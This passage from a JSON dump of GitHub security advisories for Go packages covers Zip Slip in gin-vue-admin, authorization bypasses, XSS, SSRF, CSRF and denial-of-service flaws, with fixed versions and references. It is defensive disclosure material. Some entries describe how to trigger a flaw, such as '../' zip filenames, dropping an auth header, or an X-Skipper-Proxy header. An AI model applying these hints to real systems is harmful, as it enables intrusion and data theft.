f.FileInfo().IsDir() {\n\t\t\tos.MkdirAll(fpath, os.ModePerm)\n...\n```\nIt can be analyzed that after uploading a zip compressed file, the `Unzip` method will be called to decompress the compressed file, and then judge whether the compressed file contains the fixed directory structure of server, web, and plugin.\n\nWhether the zip file is correct or not, it will be decompressed first. If the directory does not exist, it will be created automatically. Therefore, malicious zip packages can be constructed, and directory traversal can be performed during automatic decompression to upload or overwrite any file.\n\nUse the Zip Slip vulnerability to construct a malicious zip package with `../../../../` filenames, and upload the malicious zip package to trigger the vulnerability.\n\n![1](https://user-images.githubusercontent.com/113822259/197387942-e40c188d-cff0-4da3-84ba-7ca670d9bf72.png)\n![2](https://user-images.githubusercontent.com/113822259/197387956-cef8fd0d-978a-47ae-a65e-e28367f6a0b8.png)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/flipped-aurora/gin-vue-admin/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/flipped-aurora/gin-vue-admin/security/advisories/GHSA-7gc4-r5jr-9hxv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39345"}, {"type": "WEB", "url": "https://github.com/flipped-aurora/gin-vue-admin/issues/1263"}, {"type": "WEB", "url": "https://github.com/flipped-aurora/gin-vue-admin/pull/1264"}, {"type": "PACKAGE", "url": "https://github.com/flipped-aurora/gin-vue-admin"}, {"type": "WEB", "url": "https://github.com/flipped-aurora/gin-vue-admin/blob/main/server/service/system/sys_auto_code.go"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-10-25T21:02:23Z", "nvd_published_at": "2022-10-25T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2w6m-q946-399r", "modified": "2022-10-06T18:21:11Z", "published": "2022-10-04T00:00:25Z", "aliases": ["CVE-2022-38817"], "summary": "Dapr Dashboard vulnerable to Incorrect Access Control", "details": "Dapr Dashboard v0.1.0 through v0.10.0 is vulnerable to Incorrect Access Control that allows attackers to obtain sensitive data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dapr/dashboard"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"last_affected": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-38817"}, {"type": "WEB", "url": "https://github.com/dapr/dashboard/issues/222"}, {"type": "PACKAGE", "url": "https://github.com/dapr/dashboard"}], "database_specific": {"cwe_ids": ["CWE-306"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-04T21:59:06Z", "nvd_published_at": "2022-10-03T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f4mm-2r69-mg5f", "modified": "2023-06-27T21:55:58Z", "published": "2022-10-25T20:21:33Z", "aliases": ["CVE-2022-39342"], "summary": "OpenFGA Authorization Bypass", "details": "### Overview\nDuring our internal security assessment, it was discovered that OpenFGA versions `v0.2.3` and prior are vulnerable to authorization bypass under certain conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you are using `openfga/openfga` version `v0.2.3` or prior, and your model has a relation defined as a tupleset (the right hand side of a \u2018from\u2019 statement) that involves anything other than a direct relationship (e.g. \u2018as self\u2019)\n\n### How to fix that?\nUpgrade to version `v0.2.4`.\n\n### Backward Compatibility\nThis update is not backward compatible.\nAny model involving rewritten tupleset relations will no longer be acceptable and has to be modified.\n  ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.2.3"}}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-f4mm-2r69-mg5f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39342"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/commit/c8db1ee3d2a366f18e585dd33236340e76e784c4"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/releases/tag/v0.2.4"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-25T20:21:33Z", "nvd_published_at": "2022-10-25T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vj4m-83m8-xpw5", "modified": "2023-06-27T21:55:53Z", "published": "2022-10-25T20:21:45Z", "aliases": ["CVE-2022-39341"], "summary": "OpenFGA Authorization Bypass via tupleset wildcard", "details": "### Overview\nDuring our internal security assessment, it was discovered that OpenFGA versions `v0.2.3` and prior are vulnerable to authorization bypass under certain conditions.\n\n### Am I affected?\nYou are affected by this vulnerability if you are using `openfga/openfga` version `v0.2.3` and you added a tuple with a wildcard (*) assigned to a tupleset relation (the right hand side of a \u2018from\u2019 statement).\n\n### How to fix that?\nUpgrade to version `v0.2.4`.\n\n### Backward Compatibility\nThis update is not backward compatible with any authorization model that uses wildcard on a tupleset relation.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.2.3"}}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-vj4m-83m8-xpw5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39341"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/commit/b466769cc100b2065047786578718d313f52695b"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/releases/tag/v0.2.4"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-25T20:21:45Z", "nvd_published_at": "2022-10-25T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mcjj-2fvq-mc3r", "modified": "2022-10-11T21:20:56Z", "published": "2022-10-11T19:00:29Z", "aliases": ["CVE-2022-32174"], "summary": "Gogs vulnerable to Cross-site Scripting", "details": "In Gogs, versions v0.6.5 through v0.12.10 are vulnerable to Stored Cross-Site Scripting (XSS) that leads to an account takeover.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.6.5"}, {"last_affected": "0.12.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-32174"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/blob/v0.12.10/public/js/gogs.js#L263"}, {"type": "WEB", "url": "https://www.mend.io/vulnerability-database/CVE-2022-32174"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-10-11T21:20:56Z", "nvd_published_at": "2022-10-11T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h8g9-6gvh-5mrc", "modified": "2022-10-06T23:12:38Z", "published": "2022-10-06T23:12:38Z", "aliases": [], "summary": "etcd vulnerable to TOCTOU of gateway endpoint authentication", "details": "### Vulnerability type\nAuthentication\n\n### Workarounds\nRefer to the [gateway documentation](https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/gateway.md). The vulnerability was spotted due to unclear documentation of how the gateway handles endpoints validation. \n\n### Detail\nThe gateway only authenticates endpoints detected from DNS SRV records, and it only authenticates the detected endpoints once. Therefore, if an endpoint changes its authentication settings, the gateway will continue to assume the endpoint is still authenticated. The auditors has noted that appropriate documentation of this validation functionality plus deprecation of this misleading functionality is an acceptable path forward.\n\n### References\nFind out more on this vulnerability in the [security audit report](https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact the [etcd security committee](https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.4.0"}, {"fixed": "3.4.10"}]}]}, {"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.3.23"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/etcd-io/etcd/security/advisories/GHSA-h8g9-6gvh-5mrc"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}], "database_specific": {"cwe_ids": ["CWE-367"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-10-06T23:12:38Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-67x4-qr35-qvrm", "modified": "2023-02-14T21:25:03Z", "published": "2022-10-05T21:26:26Z", "aliases": ["CVE-2022-39273"], "summary": "FlyteAdmin's Default OAuth Authorization Server secret must be rotated", "details": "### Impact\nUsers who enable the default [Flyte\u2019s authorization server](https://docs.flyte.org/en/latest/deployment/cluster_config/auth_setup.html#oauth2-authorization-server) without changing the default clientid hashes will be exposed to the public internet.\n\nIn an effort to make enabling authentication easier for Flyte administrators, the default configuration for Flyte Admin allows access for Flyte Propeller even after turning on authentication via a hardcoded hashed password.  This password is also set on the default Flyte Propeller configmap in the various Flyte Helm charts.  Users who enable auth but do not override this setting in Flyte Admin\u2019s configuration may unknowingly allow public traffic in by way of this default password with attackers effectively impersonating propeller.  This only applies to users who have not specified the ExternalAuthorizationServer setting.  Using an external auth server automatically turns off this default configuration is not susceptible to this vulnerability.\n\n### Patches\n1.1.44\n\n### Workarounds\nUsers should manually set the staticClients in the selfAuthServer section of their configuration if they intend to rely on Admin\u2019s internal auth server.  \n\n### References\nhttps://github.com/flyteorg/flyteadmin/pull/478\nhttps://docs.flyte.org/en/latest/deployment/cluster_config/auth_setup.html#oauth2-authorization-server \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Flyte](https://github.com/flyteorg/flyte/issues)\n* Email us [here](mailto:admin@flyte.org)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/flyteorg/flyteadmin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.44"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/security/advisories/GHSA-67x4-qr35-qvrm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39273"}, {"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/pull/478"}, {"type": "WEB", "url": "https://docs.flyte.org/en/latest/deployment/cluster_config/auth_setup.html#oauth2-authorization-server"}, {"type": "PACKAGE", "url": "https://github.com/flyteorg/flyteadmin"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1043"}], "database_specific": {"cwe_ids": ["CWE-798"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-05T21:26:26Z", "nvd_published_at": "2022-10-06T18:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m5m3-46gj-wch8", "modified": "2023-01-10T16:09:12Z", "published": "2022-10-06T19:54:55Z", "aliases": ["CVE-2022-39237"], "summary": "SIF's Digital Signature Hash Algorithms Not Validated", "details": "### Impact\n\nThe `github.com/sylabs/sif/v2/pkg/integrity` package does not verify that the hash algorithm(s) used are cryptographically secure when verifying digital signatures.\n\n### Patches\n\nA patch is available in version >= v2.8.1 of the module. Users are encouraged to upgrade.\n\nThe patch is commit https://github.com/sylabs/sif/commit/07fb86029a12e3210f6131e065570124605daeaa\n\n### Workarounds\n\nUsers may independently validate that the hash algorithm(s) used for metadata digest(s) and signature hash are cryptographically secure.\n\n### References\n\n* [CVE-2004-2761](https://nvd.nist.gov/vuln/detail/cve-2004-2761)\n* [CVE-2005-4900](https://nvd.nist.gov/vuln/detail/cve-2005-4900)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [github.com/sylabs/sif](https://github.com/sylabs/sif/issues/new)\n* Email us at [security@sylabs.io](mailto:security@sylabs.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/sif/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.8.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sylabs/sif/security/advisories/GHSA-m5m3-46gj-wch8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39237"}, {"type": "WEB", "url": "https://github.com/sylabs/sif/commit/07fb86029a12e3210f6131e065570124605daeaa"}, {"type": "PACKAGE", "url": "https://github.com/sylabs/sif"}, {"type": "WEB", "url": "https://github.com/sylabs/sif/releases/tag/v2.8.1"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/cve-2004-2761"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/cve-2005-4900"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1045"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202210-19"}], "database_specific": {"cwe_ids": ["CWE-327", "CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-06T19:54:55Z", "nvd_published_at": "2022-10-06T18:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p658-8693-mhvg", "modified": "2023-02-15T19:32:29Z", "published": "2022-10-07T07:23:51Z", "aliases": ["CVE-2021-21271"], "summary": "Tendermint Core vulnerable to Uncontrolled Resource Consumption", "details": "### Description \n\nTendermint Core v0.34.0 introduced a new way of handling evidence of misbehavior. As part of this, [we added a new `Timestamp` field to `Evidence` structs](https://github.com/tendermint/tendermint/pull/5219). This timestamp would be calculated using the same algorithm that is used when a block is created and proposed. (This algorithm relies on the timestamp of the last commit from this specific block.) \n\nIn Tendermint Core v0.34.0-v0.34.2, the `consensus` reactor is responsible for forming `DuplicateVoteEvidence` whenever double signs are observed. However, the current block is still \u201cin flight\u201d when it is being formed by the `consensus` reactor. It hasn\u2019t been finalized through network consensus yet. This means that different nodes in the network may observe different \u201clast commits\u201d when assigning a timestamp to `DuplicateVoteEvidence.`\n\nIn turn, different nodes could form `DuplicateVoteEvidence` objects at the same height but with different timestamps. One `DuplicateVoteEvidence` object (with one timestamp) will then eventually get finalized in the block, but this means that any `DuplicateVoteEvidence` with a different timestamp is considered invalid. Any node that formed invalid `DuplicateVoteEvidence` will continue to propose invalid evidence; its peers may see this, and choose to disconnect from this node. This bug means that double signs are DoS vectors in Tendermint Core v0.34.0-v0.34.2. \n\nTendermint Core v0.34.3 is a security release which fixes this bug. As of v0.34.3, `DuplicateVoteEvidence` is no longer formed by the `consensus` reactor; rather, the `consensus` reactor passes the `Vote`s themselves into the `EvidencePool`, which is now responsible for forming `DuplicateVoteEvidence`. The `EvidencePool` has timestamp info that should be consistent across the network, which means that `DuplicateVoteEvidence` formed in this reactor should have consistent timestamps. \n\nThis release changes the API between the `consensus` and `evidence` reactors. \n\n### Impact\n\nThis is a denial-of-service vector which impacts networks running Tendermint Core v0.34.0 - v0.34.2.\n\n### Remediation\n\nThis problem has been patched in Tendermint Core v0.34.3. Networks running impacted versions of Tendermint Core should update immediately.\n\n### Workarounds\n\nThere are no workarounds, other than upgrading to a patched version of Tendermint Core.\n\n### Credits \n\n* Crypto.com (@cyril-crypto, @brianatcrypto, @tomtau and  @yihuang) for finding and submitting this vulnerability\n* @melekes and @cmwaters for identifying the root cause and patching the problem \n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [tendermint/tendermint](https://github.com/tendermint/tendermint)\n* Email us at [security@tendermint.com](mailto:security@tendermint.com)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tendermint/tendermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.34.0"}, {"fixed": "0.34.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tendermint/tendermint/security/advisories/GHSA-p658-8693-mhvg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21271"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/commit/a2a6852ab99e4a0f9e79f0ea8c1726e262e25c76"}, {"type": "PACKAGE", "url": "https://github.com/tendermint/tendermint"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/blob/v0.34.3/CHANGELOG.md#v0.34.3"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1052"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-07T07:23:51Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-mqqv-chpx-vq25", "modified": "2022-10-07T07:17:56Z", "published": "2022-10-07T07:17:56Z", "aliases": ["CVE-2020-7711"], "summary": "goxmldsig vulnerable to crash on nil-pointer dereference caused by sending malformed XML signatures", "details": "This affects all versions of package github.com/russellhaering/goxmldsig prior to 1.1.1. There is a crash on nil-pointer dereference caused by sending malformed XML signatures. This issue is patched in version 1.1.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/goxmldsig"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/russellhaering/gosaml2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7711"}, {"type": "WEB", "url": "https://github.com/russellhaering/goxmldsig/issues/48"}, {"type": "PACKAGE", "url": "https://github.com/russellhaering/goxmldsig"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0046"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUSSELLHAERINGGOXMLDSIG-608301"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-07T07:17:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-mxrx-fg8p-5p5j", "modified": "2022-10-21T13:03:47Z", "published": "2022-10-18T19:57:50Z", "aliases": ["CVE-2022-39267"], "summary": "Bifrost vulnerable to authentication check flaw that leads to authentication bypass", "details": "### Impact\nThe admin and monitor user groups need to be authenticated by username and password. If we delete the X-Requested-With: XMLHttpRequest field in the request header,the authentication will be bypassed.\n\n### Patches\nhttps://github.com/brockercap/Bifrost/pull/201\n\n### Workarounds\nUpgrade to the latest version", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/brokercap/Bifrost"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.7-release"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/brokercap/Bifrost/security/advisories/GHSA-mxrx-fg8p-5p5j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39267"}, {"type": "WEB", "url": "https://github.com/brockercap/Bifrost/pull/201"}, {"type": "WEB", "url": "https://github.com/brokercap/Bifrost/commit/63da5c8eb7eb21639ea7ac199fe10b5e07b03a8a"}, {"type": "PACKAGE", "url": "https://github.com/brokercap/Bifrost"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-18T19:57:50Z", "nvd_published_at": "2022-10-19T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-69ch-w2m2-3vjp", "modified": "2023-10-02T11:18:20Z", "published": "2022-10-14T19:00:40Z", "aliases": ["CVE-2022-32149"], "summary": "golang.org/x/text/language Denial of service via crafted Accept-Language header", "details": "The BCP 47 tag parser has quadratic time complexity due to inherent aspects of its design. Since the parser is, by design, exposed to untrusted user input, this can be leveraged to force a program to consume significant time parsing Accept-Language headers. The parser cannot be easily rewritten to fix this behavior for various reasons. Instead the solution implemented in this CL is to limit the total complexity of tags passed into ParseAcceptLanguage by limiting the number of dashes in the string to 1000. This should be more than enough for the majority of real world use cases, where the number of tags being sent is likely to be in the single digits.\n\n### Specific Go Packages Affected\ngolang.org/x/text/language", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/text"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-32149"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/56152"}, {"type": "WEB", "url": "https://github.com/golang/text/commit/434eadcdbc3b0256971992e8c70027278364c72c"}, {"type": "PACKAGE", "url": "https://github.com/golang/text"}, {"type": "WEB", "url": "https://go.dev/cl/442235"}, {"type": "WEB", "url": "https://go.dev/issue/56152"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/-hjNw559_tE/m/KlGTfid5CAAJ"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1059"}], "database_specific": {"cwe_ids": ["CWE-772"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-28T20:11:26Z", "nvd_published_at": "2022-10-14T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x279-68rr-jp4p", "modified": "2022-10-07T07:25:33Z", "published": "2022-10-07T07:25:33Z", "aliases": [], "summary": "Blst vulnerable to incorrect results for some inputs in blst_fp_eucl_inverse function", "details": "### Impact\nBlst versions v0.3.0 to v0.3.2 can produce the incorrect outputs for some inputs to the blst_fp_eucl_inverse function. This could theoretically result in the creation of an invalid signature from correct inputs. However, fuzzing of higher level functions such as sign and verify were unable to produce incorrect results and there has been no reported occurrences of this issue being encountered in production use.\n\n### Description\nDuring the course of differential fuzzing of the blst library by @guidovranken it was discovered that blst would produce the incorrect result for some input values in the inverse function. This was the result of the introduction of a new inversion formula in version v0.3.0. This source of these incorrect outputs was due to two issues:\n\n1. The amount of inner loop iterations was not sufficient for the algorithm to converge.\n2. It was erroneously assumed that the absolute value of the intermediate result would be capped at 767-bits. As a result, some output values were truncated by one bit or the most significant bit was misinterpreted as the sign.\n\n### Patches\nThis issue has been resolved in the v0.3.3 release and users are recommended to upgrade immediately.\n\n### References\nThe software used to uncover this issue can be found [here](https://github.com/guidovranken/cryptofuzz).\n\n### Credits\nA special thanks to Guido Vranken (@guidovranken) for his discovery and disclosure of this vulnerability.\n\n### For more information\nIf you have any questions or comments about this advisory please email us at [hello@supranational.net](mailto:hello@supranational.net)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/supranational/blst"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/supranational/blst/security/advisories/GHSA-x279-68rr-jp4p"}, {"type": "WEB", "url": "https://github.com/supranational/blst/commit/dd980e7f81397895705c49fcb4f52e485bb45e21"}, {"type": "PACKAGE", "url": "https://github.com/supranational/blst"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1053"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-07T07:25:33Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-93m7-c69f-5cfj", "modified": "2022-10-07T07:20:03Z", "published": "2022-10-07T07:20:03Z", "aliases": ["CVE-2020-25614"], "summary": "xmlquery lacks check for whether LoadURL response is in XML format, causing denial of service", "details": "xmlquery before 1.3.1 lacks a check for whether a LoadURL response is in the XML format, which allows attackers to cause a denial of service (SIGSEGV) at xmlquery.(*Node).InnerText or possibly have unspecified other impact.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/antchfx/xmlquery"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-25614"}, {"type": "WEB", "url": "https://github.com/antchfx/xmlquery/issues/39"}, {"type": "WEB", "url": "https://github.com/antchfx/xmlquery/commit/5648b2f39e8d5d3fc903c45a4f1274829df71821"}, {"type": "PACKAGE", "url": "https://github.com/antchfx/xmlquery"}, {"type": "WEB", "url": "https://github.com/antchfx/xmlquery/compare/v1.3.0...v1.3.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0048"}], "database_specific": {"cwe_ids": ["CWE-119", "CWE-20"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-10-07T07:20:03Z", "nvd_published_at": "2020-09-16T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f2rj-m42r-6jm2", "modified": "2023-08-30T09:52:10Z", "published": "2022-10-25T20:22:29Z", "aliases": ["CVE-2022-38580"], "summary": "Skipper vulnerable to SSRF via X-Skipper-Proxy", "details": "### Impact\n\nSkipper prior to version v0.13.236 is vulnerable to server-side request forgery (SSRF). An attacker can exploit a vulnerable version of proxy to access the internal metadata server or other unauthenticated URLs by adding an specific header (X-Skipper-Proxy) to the http request.\n\n### Patches\nThe problem was patched in version https://github.com/zalando/skipper/releases/tag/v0.13.237.\nUsers need to upgrade to skipper `>=v0.13.237`.\n\n### Workarounds\n\nUse `dropRequestHeader(\"X-Skipper-Proxy\")` filter\n\n### References\n\nhttps://github.com/zalando/skipper/releases/tag/v0.13.237\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue in https://github.com/zalando/skipper/issues/new/choose\n* Chat with us in slack: https://app.slack.com/client/T029RQSE6/C82Q5JNH5", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zalando/skipper"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.237"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/zalando/skipper/security/advisories/GHSA-f2rj-m42r-6jm2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-38580"}, {"type": "WEB", "url": "https://github.com/zalando/skipper/pull/2058"}, {"type": "WEB", "url": "https://github.com/zalando/skipper/commit/842634347da8fe77e396f66edea79d329fd72130"}, {"type": "WEB", "url": "https://gist.github.com/Fadavvi/9fffcfa4aaa9e25b77cfe7b3044b2857#file-cve-2022-38580"}, {"type": "PACKAGE", "url": "https://github.com/zalando/skipper"}, {"type": "WEB", "url": "https://github.com/zalando/skipper/releases/tag/v0.13.237"}, {"type": "WEB", "url": "https://pastebin.com/dXxpgPAK"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1086"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/171546/X-Skipper-Proxy-0.13.237-Server-Side-Request-Forgery.html"}, {"type": "WEB", "url": "http://skipper.com"}, {"type": "WEB", "url": "http://zalando.com"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-10-25T20:22:29Z", "nvd_published_at": "2022-10-25T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mwwc-3jv2-62j3", "modified": "2022-10-13T18:05:31Z", "published": "2022-10-11T19:00:29Z", "aliases": ["CVE-2022-32175"], "summary": "AdGuardHome vulnerable to Cross-Site Request Forgery", "details": "In AdGuardHome, versions v0.95 through v0.108.0-b.13 are vulnerable to Cross-Site Request Forgery (CSRF), in the custom filtering rules functionality. An attacker can persuade an authorized user to follow a malicious link, resulting in deleting/modifying the custom filtering rules.\n\nThe file that contains the vulnerable code is no longer present as of v0.108.0-b.16.", "severity": [{"type": "CVSS_V3", "score": 